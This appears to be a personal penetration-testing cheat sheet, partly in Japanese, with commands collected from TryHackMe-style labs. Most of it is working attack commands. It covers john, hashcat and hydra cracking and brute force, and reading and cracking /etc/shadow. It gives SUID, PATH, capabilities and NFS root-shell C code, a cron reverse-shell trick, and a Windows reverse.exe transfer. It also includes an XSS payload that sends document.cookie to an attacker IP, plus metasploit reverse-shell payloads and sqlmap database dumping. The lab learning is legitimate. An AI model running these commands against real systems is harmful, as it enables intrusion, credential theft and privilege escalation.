## john
### hashtype
    cat hash.txt | hash-identifier
### GOSTで重複排除
    john --wordlist=easypeasy.txt --format=GOST hash.txt 
### passphrase付きrsaファイルはまずssh2johnでhash化してからjohn
    python3 /usr/share/john/ssh2john.py idrsa.id_rsa > rsahash
    john --wordlist=wds/rockyou.txt rsahash
### zippassword
    zip2john chrismaslists.xip > hash.txt
    john hash.txt

## hydra
### webloginform
    hydra -l molly -P rockyou.txt 10.10.112.172 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V  
### SSH
    hydra -p 4567 -l molly -P wds/rockyou.txt 10.10.191.167 -t 4 ssh

## gobuster hidden directories
    gobuster dir -u http://10.10.69.172:3000/ -w wds/rockyou.txt

## hashcat(res.txtに出力 '-m 1800' はsha-512)
    hashcat -m 1800 -a 0 -o res.txt --remove h.txt wds/dirb/common.txt

## wfuzz
    wfuzz -X POST -w wds/wfuzz/general/common.txt --hh=45 http://10.10.149.50/api/items?FUZZ=oops

## reverse shell で must be run from a terminal エラー (spawning a TTY Shell)
    python -c 'import pty; pty.spawn("/bin/sh")'

## grep (ipaddress)
    grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file2.txt

## steghide
### ファイル抽出（PNGはzsteg） 
    steghide extract -sf binarycodepixabay.jpg
    binwalk meme.jpg
    strings meme.jpg 

## Spectrograms
### SonicVisualiser: Layer -> Add Spectogram

## ユーザでログイン可能、sudo -l 不可
    cat /etc/crontab
    1. 実行可能なシェルファイルがあればreverse shellを追記
    2. nc -lvnp 4444 で待機
    3. シェルファイルをcatで開く（実行）

## hostsファイルに追記
    echo "10.10.250.199 team.thm" | sudo tee -a /etc/hosts

## metasploit
### payloadをセット（別画面でncでポート開放は不要）
    set payload php/meterpreter/bind_tcp
    show options

## Search
### filename
    find / -type f -iname user.txt 2> /dev/null #inameは大文字小文字区別なし
### permission
    find / -type f -user root -perm -4000 -exec ls -al {} + 2> /dev/null

## Kali Linux automount設定
    nano /etc/wsl.conf

    [automount]
    enabled = false

## Passive Reconnaissance
###      Whois
        whois tryhackme.com

###       dig
        dig tryhackme.com A
        dig @1.1.1.1 tryhackme.com MX
        dig tryhackme.com TXT

## GPG
### encrypt
    gpg --cipher-algo AES-256 --symmetric secret.txt
### decrypt(with key)
    gpg --import tryhackme.key
    gpg message.gpg
    cat message
### decrypt(with passphrase)
    gpg -d note1.txt.gpg   
### decrypt(crack passphrase)
    gpg2john secret.txt.gpg > hash.txt
    john --wordlist=rockyou.txt --format=gpg hash.txt
    gpg secret.txt.gpg
    cat secret.txt


## RSA
### generate private.key
    openssl genrsa -aes256 -out private.key 8912 #8912 bits long
### generate public.key
    openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt
### decrypt
    openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt


## Linux PrivEsc
    hostname
    uname -a
    cat /proc/version
    cat /etc/issue
    ps -A
    ps axjf
    ps aux
    env

## find
### current
    find . -iname flag.txt 2> /dev/null
### directory
    find / -type d -name config 2> /dev/null
### permission
    find / -type f -perm 0777 2> /dev/null
### exectable
    find / -perm a=x 2> /dev/null
### user
    find /home -user frank 2> /dev/null
### recently modified(accessed -atime -newermt)
    find / -mtime 10 2> /dev/null
    find workflows/ -type f -newermt 2016-09-11 ! -newermt 2016-09-13  #更新日2016-09-12のみ検索
### size
    find / -size 50M 2> /dev/null
### writable directory(exectable x)
    find / -o w -type d 2>/dev/null
### suid bit
    find / -perm -u=s -type f 2>/dev/null
### 中身
    find . -type f -print | xargs grep 'password'
### find exec
    find /home/igor/flag1.txt -exec cat {} \;  #igorが/usr/bin/findの実行権限を持っている場合
    find . -iname "*.txt" -exec exiftool '{}' -"Version" \;  #テキストファイルを検索してmetadataに"Version"があれば列挙
### find and move
    find /home -iname '*.zip' -exec mv '{}' /backup/ \;

## SSH
### SCPでファイル転送(local to remote)
    scp file.exe karen@10.10.83.120:/tmp
### SCPでファイル転送(remote to local)
    scp sarah@10.10.138.61:/home/sarah/ww.mnf /home/z003y 

## Complie file.c
    gcc file.c -o exefilename   

## passwd & shadow (without cat)
    base64 /etc/passwd | base64 --decode
    base64 /etc/shadow | base64 --decode
    unshadow passwd.txt shadow.txt > hash.txt
    john --wordlist=wds/rockyou.txt hash.txt
    base64 /home/ubuntu/flag3.txt | base64 --decode

## Capabilities
    getcap -r / 2>/dev/null
    vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

## PATH
### path_exp.c
    #include<unistd.h>
    void main()
    { setuid(0);
      setgid(0);
      system("thm");
    }

### path_exp.c compile
    gcc path_exp.c -o path -w
    chmod u+s path

### add $PATH
    export PATH=/tmp:$PATH
    cd /tmp
    echo "/bin/bash" > thm
    chmod 777 thm
    ./thm

## mount
### ターゲットにマウント
    showmount -e 10.10.4.211 #マウント先の一覧
    mkdir /tmp/sharedfolder
    mount -o rw 10.10.4.211:/home/ubuntu/sharedfolder /tmp/sharedfolder

### cファイル作成
    ここから
    #include <stdio.h>
    #include <stdlib.h>

    int main()
    {   
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
    }
    ここまで

    gcc main.c -o pwned -w

### ファイル転送
    cp pwned /tmp/sharedfolder
    chown root:root /tmp/sharedfolder/pwned
    chmod +s /tmp/sharedfolder/pwned

### ターゲット側の作業
    cd /home/ubuntu/sharedfolder
    ./pwned

## Windows PrivEsc
### smbserverを使ったファイル転送
    python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .  #attacker
    nc -vlnp 4444  #attacker
    copy \\10.2.69.81\tools\reverse.exe C:\PrivEsc\reverse.exe  #victim
    C:\PrivEsc\reverse.exe  #victim

## base64 decode
    cat encoded.txt | base64 -d > new.txt

## xfreerdp
    xfreerdp /u:admin /p:letmein /v:10.10.104.140

## Wireshark
### Analyze -> Follow -> TCP StreamでFilter
### Edit -> Find Next -> Packetlist -> ドロップダウンでPacketbytes  && Display filter -> ドロップダウンでString
### file -> Export Objects -> HTTP -> christmaslist.zip

# 行指定でファイルを開く
    sed -n 52p nice_list.txt

## metasploit
### payloads
    linux/x86/meterpreter/reverse_tcp
    windows/shell_reverse_tcp
    windows/shell_bind_tcp
    windows/exec
    windows/upexec/bind_tcp
    windows/vncinject/bind_tcp

    search linux/x86/meterpreter/reverse_tcp
    set PAYLOAD payload/linux/x86/meterpreter/reverse_tcp

## NFS
    showmount -e 10.10.125.220
    mkdir /mnt/nfs
    mount -t nfs 10.10.125.220:/opt/files /mnt/nfs/ #catはフルパスでファイルを指定

## XSS
### inputform に入力
    <script>alert(1);</script> #ポップアップが表示されれば脆弱性あり
    nc -lvnp 4444 #ローカルで実行
    <script>window.location = 'http://10.2.69.81:4444/page?param=' + document.cookie </script> #inputformに入力してsubmit

## radare2
    r2 -d if2
    aaa           #解析
    pdf @main     #main関数を表示
    db 0x00400b76 #set breakpoint
    dc            #continue
    px @ rbp-0x8  #var-8hの値を表示

## burpsuite sql-injection
    sqlmap -u http://10.10.182.6/register.php --forms #脆弱性チェック
    intercept onにしてログインフォームでユーザ登録
    登録ユーザでログイン、キャプチャされたログをAction → Save itemでファイル保存(req.txt)
    sqlmap -r req.txt --current-db #データベース名チェック
    sqlmap -r req.txt -D social --tables #socialデータベースのテーブルリストを出力

